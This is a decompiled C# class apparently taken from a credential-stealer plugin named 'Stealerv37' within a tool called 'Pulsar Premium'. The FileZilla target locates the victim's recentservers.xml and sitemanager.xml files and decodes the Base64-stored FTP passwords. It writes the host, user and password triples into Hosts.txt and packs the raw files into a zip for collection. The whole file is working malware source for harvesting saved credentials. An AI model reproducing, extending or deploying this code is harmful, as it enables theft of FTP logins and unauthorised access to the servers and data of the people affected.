// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.FileZilla
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;

#nullable disable
namespace Intelix.Targets.Applications;

public class FileZilla : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
    string[] strArray = new string[2]
    {
      str1 + "recentservers.xml",
      str1 + "sitemanager.xml"
    };
    if (!File.Exists(strArray[0]) && !File.Exists(strArray[1]))
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (FileZilla);
    List<string> stringList = new List<string>();
    foreach (string str2 in strArray)
    {
      if (File.Exists(str2))
      {
        XmlDocument xmlDocument = new XmlDocument();
        xmlDocument.Load(str2);
        foreach (XmlNode xmlNode in xmlDocument.GetElementsByTagName("Server"))
        {
          string innerText1 = xmlNode?["Pass"]?.InnerText;
          if (!string.IsNullOrEmpty(innerText1))
          {
            string str3 = $"ftp://{xmlNode["Host"]?.InnerText}:{xmlNode["Port"]?.InnerText}/";
            string innerText2 = xmlNode["User"]?.InnerText;
            string str4 = Encoding.UTF8.GetString(Convert.FromBase64String(innerText1));
            stringList.Add($"Url: {str3}\nUsername: {innerText2}\nPassword: {str4}");
          }
        }
        string entryPath = "FileZilla\\" + Path.GetFileName(str2);
        zip.AddFile(entryPath, File.ReadAllBytes(str2));
        counterApplications.Files.Add($"{str2} => {entryPath}");
      }
    }
    string entryPath1 = "FileZilla\\Hosts.txt";
    counterApplications.Files.Add(entryPath1 ?? "");
    zip.AddTextFile(entryPath1, string.Join("\n\n", stringList.ToArray()));
    counter.Applications.Add(counterApplications);
  }
}
